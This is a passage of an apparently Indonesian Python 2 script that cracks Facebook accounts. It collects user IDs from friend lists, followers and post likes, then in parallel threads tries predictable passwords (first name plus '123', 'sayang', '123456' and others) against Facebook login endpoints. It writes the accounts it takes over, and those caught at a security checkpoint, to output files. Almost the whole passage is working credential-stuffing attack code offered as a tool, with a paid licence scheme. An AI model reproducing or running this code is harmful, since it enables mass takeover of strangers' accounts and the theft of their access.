		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "3" or ask == "03":
		print "\n [*] Masukan ID Postingan Nya Ajah"
		idt = raw_input(" [+] ID Post : ")
		r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token)
		z = json.loads(r.text)
		for i in z['data']:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "0" or ask == "00":
		os.system("rm -f login.txt") 
		print " [!] Berhasil Menghapus Token"
		exit()
	else:
		print " [!] Pilih Yang Bener !"
		exit()
	print " [*] Total ID : "+str(len(id))
	ask = raw_input(" [*] Gunakan Password Manual? [Y/t]: ")
	if ask =="Y" or ask =="y":
		manual()
	print " [+] File \033[0;92mOK\033[0;97m Tersimpan Di : out/ok.txt"
	print " [+] File \033[0;93mCP\033[0;97m Tersimpan Di : out/cp.txt"
	print " [!] Sedang Prosess Crack\n"
		
	def main(arg):
		global ok,cp
		user = arg
		uid,name=user.split("|") ##Gk Usah Di Ganti Ajg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			pass1 = name.lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(uid)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass1
				ok.append(uid+' | '+pass1)
				save = open('out/ok.txt','a')
				save.write(str(uid)+' | '+str(pass1)+'\n')
				save.close()
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass1
					cp.append(uid+' | '+pass1)
					save = open('out/cp.txt','a')
					save.write(str(uid)+' | '+str(pass1)+'\n')
					save.close()
				else:
					pass2 = name.lower()+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(uid)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass2
						cp.append(uid+' | '+pass2)
						save = open('out/ok.txt','a')
						save.write(str(uid)+' | '+str(pass2)+'\n')
						save.close()
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass2
							cp.append(uid+' | '+pass2)
							save = open('out/cp.txt','a')
							save.write(str(uid)+' | '+str(pass2)+'\n')
							save.close()
						else:
							pass3 = "sayang"
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(uid)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' +pass3
								ok.append(uid+' | '+pass3)
								save = open('out/ok.txt','a') 
								save.write(str(uid)+' | '+str(pass3)+'\n')
								save.close()
							else:
								if 'www.facebook.com' in q['error_msg']:
									print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass3
									ok.append(uid+' | '+pass3)
									save = open('out/cp.txt','a')
									save.write(str(uid)+' | '+str(pass3)+'\n')
									save.close() 
								else:
									pass4 = 'bangsat'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(uid)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass4
										ok.append(uid+' | '+pass4)
										save = open('out/ok.txt','a')
										save.write(str(uid)+' | '+str(pass4)+'\n')
										save.close()
									else:
										if 'www.facebook.com' in q['error_msg']:
											print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass4
											cp.append(uid+' | '+pass4)
											save = open('out/cp.txt','a')
											save.write(str(uid)+' | '+str(pass4)+'\n')
											save.close()
										else:
											pass5 = 'anjing'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(uid)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass5
												ok.append(uid+' | '+pass5)
												save = open('out/ok.txt','a')
												save.write(str(uid)+' | '+str(pass5)+'\n')
												save.close()
											else:
												if 'www.facebook.com' in q['error_msg']:
													print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass5
													cp.append(uid+' | '+pass5)
													save = open('out/cp.txt','a')
													save.write(str(uid)+' | '+str(pass5)+'\n')
													save.close()
							
					
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print "\n [+] Finished"
	print " [*] Total \033[0;92mOK\033[0;97m : "+str(len(ok))
	print " [*] Total \033[0;93mCP\033[0;97m : "+str(len(cp))
	exit()
			
			
			
			

def crack_indo():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;97m   ! Token Invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print '\x1b[0;94m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
    print '\x1b[0;97m   1.\x1b[0;97m Crack Dari Daftar Teman'
    print '\x1b[0;97m   2.\x1b[0;97m Crack Dari Publik/Teman'
    print '\x1b[0;97m   0.\x1b[0;97m Kembali'
    print '\x1b[0;94m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
    pilih_indo()


def pilih_indo():
    global CP
    global oks
    teak = raw_input('\x1b[0;97m   >\x1b[0;97m ')
    if teak == '':
        print '\x1b[0;97m   ! Isi Yg Benar'
        pilih_indo()
    elif teak == '1':
        os.system('clear')
        print logo
        print '\x1b[0;94m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    elif teak == '2':
        os.system('clear')
        print logo
        print '\x1b[0;94m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
        idt = raw_input('\x1b[0;97m   \xe2\x80\xa2 \x1b[0;97mID Publik/Teman \x1b[0;97m:\x1b[0;97m ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            sp = json.loads(pok.text)
            print '\x1b[0;97m   \xe2\x80\xa2\x1b[0;97m Nama \x1b[0;97m:\x1b[0;97m ' + sp['name']
        except KeyError:
            print '\x1b[0;97m   ! ID publik/teman tidak ada'
            raw_input('\n\x1b[1;97m   < \x1b[0;97mKembali \x1b[0;97m>')
            crack_indo()
        except requests.exceptions.ConnectionError:
            print '\x1b[0;97m   ! Tidak ada koneksi'
            keluar()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])

    elif teak == '0' or teak == '00':
        crack_teman()
    else:
        print '\x1b[0;97m   ! Isi Yg Benar'
        pilih_indo()
    print '\x1b[0;97m   \xe2\x80\xa2 \x1b[0;97mJumlah ID\x1b[0;97m :\x1b[0;97m ' + str(len(id))
    
    
    def main(arg):
        em = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + em + '/?access_token=' + toket)
            v = json.loads(an.text)
            pw = v['first_name'].lower() + '123'
            rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pw, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'})
            xo = rex.content
            if 'mbasic_logout_button' in xo or 'save-device' in xo:
                print '\x1b[0;97m   [OK]\x1b[0;97m ' + em + ' \x1b[0;97m\xe2\x80\xa2 \x1b[0;97m' + pw
                oke = open('done/indo.txt', 'a')
                oke.write('\n   [OK] ' + em + ' \xe2\x80\xa2 ' + pw)
                oke.close()
                oks.append(em)
            elif 'checkpoint' in xo:
                print '\x1b[0;97m   [CP]\x1b[0;97m ' + em + ' \x1b[0;97m\xe2\x80\xa2\x1b[0;97m ' + pw
                cek = open('done/indo.txt', 'a')
                cek.write('\n   [CP] ' + em + ' \xe2\x80\xa2 ' + pw)
                cek.close()
                CP.append(em)
            else:
                pw2 = v['first_name'].lower() + '12345'
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pw2, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36'})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print '\x1b[0;97m   [OK]\x1b[0;97m ' + em + ' \x1b[0;97m\xe2\x80\xa2 \x1b[0;97m' + pw2
                    oke = open('done/indo.txt', 'a')
                    oke.write('\n   [OK] ' + em + ' \xe2\x80\xa2 ' + pw2)
                    oke.close()
                    oks.append(em)
                elif 'checkpoint' in xo:
                    print '\x1b[0;97m   [CP]\x1b[0;97m ' + em + ' \x1b[0;97m\xe2\x80\xa2\x1b[0;97m ' + pw2
                    cek = open('done/indo.txt', 'a')
                    cek.write('\n   [CP] ' + em + ' \xe2\x80\xa2 ' + pw2)
                    cek.close()
                    CP.append(em)
                else:
                    pw3 = 'sayang'
                    rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pw3, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36'})
                    xo = rex.content
                    if 'mbasic_logout_button' in xo or 'save-device' in xo:
                        print '\x1b[0;97m   [OK]\x1b[0;97m ' + em + ' \x1b[0;97m\xe2\x80\xa2 \x1b[0;97m' + pw3
                        oke = open('done/indo.txt', 'a')
                        oke.write('\n   [OK] ' + em + ' \xe2\x80\xa2 ' + pw3)
                        oke.close()
                        oks.append(em)
                    elif 'checkpoint' in xo:
                        print '\x1b[0;97m   [CP]\x1b[0;97m ' + em + ' \x1b[0;97m\xe2\x80\xa2\x1b[0;97m ' + pw3
                        cek = open('done/indo.txt', 'a')
                        cek.write('\n   [CP] ' + em + ' \xe2\x80\xa2 ' + pw3)
                        cek.close()
                        CP.append(em)
                    else:
                        pw4 = 'bismillah'
                        rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pw4, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36'})
                        xo = rex.content
                        if 'mbasic_logout_button' in xo or 'save-device' in xo:
                            print '\x1b[0;97m   [OK]\x1b[0;97m ' + em + ' \x1b[0;97m\xe2\x80\xa2 \x1b[0;97m' + pw4
                            oke = open('done/indo.txt', 'a')
                            oke.write('\n   [OK] ' + em + ' \xe2\x80\xa2 ' + pw4)
                            oke.close()
                            oks.append(em)
                        elif 'checkpoint' in xo:
                            print '\x1b[0;97m   [CP]\x1b[0;97m ' + em + ' \x1b[0;97m\xe2\x80\xa2\x1b[0;97m ' + pw4
                            cek = open('done/indo.txt', 'a')
                            cek.write('\n   [CP] ' + em + ' \xe2\x80\xa2 ' + pw4)
                            cek.close()
                            CP.append(em)
                        else:
                            pw5 = 'anjing'
                            rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pw5, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36'})
                            xo = rex.content
                            if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                print '\x1b[0;97m   [OK]\x1b[0;97m ' + em + ' \x1b[0;97m\xe2\x80\xa2 \x1b[0;97m' + pw5
                                oke = open('done/indo.txt', 'a')
                                oke.write('\n   [OK] ' + em + ' \xe2\x80\xa2 ' + pw5)
                                oke.close()
                                oks.append(em)
                            elif 'checkpoint' in xo:
                                print '\x1b[0;97m   [CP]\x1b[0;97m ' + em + ' \x1b[0;97m\xe2\x80\xa2\x1b[0;97m ' + pw5
                                cek = open('done/indo.txt', 'a')
                                cek.write('\n   [CP] ' + em + ' \xe2\x80\xa2 ' + pw5)
                                cek.close()
                                CP.append(em)
                            else:
                                pw6 = '123456'
                                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pw6, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36'})
                                xo = rex.content
                                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                    print '\x1b[0;97m   [OK]\x1b[0;97m ' + em + ' \x1b[0;97m\xe2\x80\xa2 \x1b[0;97m' + pw6
                                    oke = open('done/indo.txt', 'a')
                                    oke.write('\n   [OK] ' + em + ' \xe2\x80\xa2 ' + pw6)
                                    oke.close()
                                    oks.append(em)
                                elif 'checkpoint' in xo:
                                    print '\x1b[0;97m   [CP]\x1b[0;97m ' + em + ' \x1b[0;97m\xe2\x80\xa2\x1b[0;97m ' + pw6
                                    cek = open('done/indo.txt', 'a')
                                    cek.write('\n   [CP] ' + em + ' \xe2\x80\xa2 ' + pw6)
                                    cek.close()
                                    CP.append(em)
        except:
            pass

    p = ThreadPool(20)
    p.map(main, id)
    print '\x1b[0;94m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
    print '\x1b[0;94m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
    print '\x1b[0;97m   \xe2\x80\xa2 \x1b[0;97mSelesai ...'
    print '\x1b[0;97m   \xe2\x80\xa2 \x1b[0;97mTotal \x1b[0;97mOK\x1b[0;97m/\x1b[0;97mCP \x1b[0;97m: \x1b[0;97m' + str(len(oks)) + '\x1b[0;97m/\x1b[0;97m' + str(len(CP))
    print '\x1b[0;97m   \xe2\x80\xa2 \x1b[0;97mOK\x1b[0;97m/\x1b[0;97mCP \x1b[0;97mfile tersimpan \x1b[0;97m: \x1b[0;97mdone/indo.txt'
    print '\x1b[0;94m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
    raw_input('\x1b[0;97m   < \x1b[0;97mKembali\x1b[0;97m >')
    menu()



def manual():
	print " [*] Contoh : Sayang, Indonesia"
	pass1 = raw_input(" [+] Password 1 : ")
	pass2 = raw_input(" [+] Password 2 : ")
	pass3 = raw_input(" [+] Password 3 : ")
	print " [+] File \033[0;92mOK\033[0;97m Tersimpan Di : out/ok.txt"
	print " [+] File \033[0;93mCP\033[0;97m Tersimpan Di : out/cp.txt"
	print " [!] Sedang Prosess Crack\n"
	
	def main(arg):
		global ok,cp
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +user+ ' | ' + pass1
				ok.append(user+' | '+pass1)
				save = open('out/ok.txt','a')
				save.write(str(user)+' | '+ str(pass1)+'\n')
				save.close()
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +user+ ' | ' + pass1
					cp.append(user+' | '+pass1)
					save = open('out/cp.txt','a')
					save.write(str(user)+' | '+str(pass1)+'\n')
					save.close()
				else:
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +user+ ' | ' + pass2
						ok.append(user+' | '+pass2)
						save = open('out/ok.txt','a')
						save.write(str(user)+' | '+str(pass2)+'\n')
						save.close()
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +user+ ' | ' + pass2
							cp.append(user+' | '+pass2)
							save = open('out/cp.txt','a')
							save.write(str(user)+' | '+str(pass2)+'\n')
							save.close()
						else:
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +user+ ' | ' + pass3
								ok.append(user+' | '+pass3)
								save = open('out/ok.txt','a')
								save.write(str(user)+' | '+str(pass3)+'\n')
								save.close()
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +user+ ' | ' + pass3
									cp.append(user+' | '+pass3)
									save = open('out/cp.txt','a')
									save.write(str(user)+' | '+str(pass3)+'\n')
									save.close()
					
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print "\n [+] Finished"
	print " [*] File \033[0;92mOK\033[0;97m Tersimpan Di : out/ok.txt"
	print " [*] File \033[0;93mCP\033[0;97m Tersimpan Di : out/cp.txt"
	exit()
      
def findid():
	os.system("clear")
	print logo
	print 50*"\33[1;96m-"
	try:
		url = raw_input("\33[1;97m[\33[1;92m>\33[1;97m] Link Profile : ")
		r = requests.get(url).text
		name = re.search('Title">(.*?)</', r).group(1).strip('| Facebook')
		id = re.search('profile/(.*?)" ', r).group(1)
		print "\33[1;97m[\33[1;92m>\33[1;97m] Name User : "+name
		print "\33[1;97m[\33[1;92m>\33[1;97m] User ID   : "+id
		raw_input(putih + '\Enter Go Back Menu')
		menu()
	except requests.exceptions.ConnectionError:
		print putih + '[' + merah + '!' + putih + '] No Connection'
		menu()
	except AttributeError:
		print putih + '[' + merah + '!' + putih + '] Username Not Found'
        raw_input(putih + '\Enter Go Back Menu')
        os.system('python2 y.py')
        
        
      
def spt():
    try:
        toket = open('licensed.log', 'r').read()
    except IOError:
        print '\x1b[1;91m License Invalid !'
        os.system('clear')
        os.system('rm -rf licensed.log')
        user()

    if os.path.exists('licensed.log'):
        user1()
    else:
        user()


def user():
    os.system('clear')
    print logo
    print 50 * '\x1b[1;92m-'
    print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Generating ID ...'
    time.sleep(3)
    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] ID Generating Success'
    id = uuid.uuid4().hex[:25]
    idg = open('licensed.log', 'w')
    idg.write(id)
    idg.close()
    print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] ID : \x1b[92m' + id
    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Successfully'
    print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Your ID Has Not Been Confirmed'
    print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Please Contact Admin for ID Confirmation'
    raw_input('\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Press Enter to Chat Admin')
    os.system('am start https://wa.me/6285946352369text=saya+ingin+upgrade+ke+premium+ini+id+saya%20ID:%20' + id + ' >/dev/null')
    time.sleep(1)
    os.sys.exit()


def user1():
    try:
        j = open('licensed.log', 'r').read()
        r = requests.get('https://github.com/dark-fb1777/user/blob/main/user.txt').text.strip()
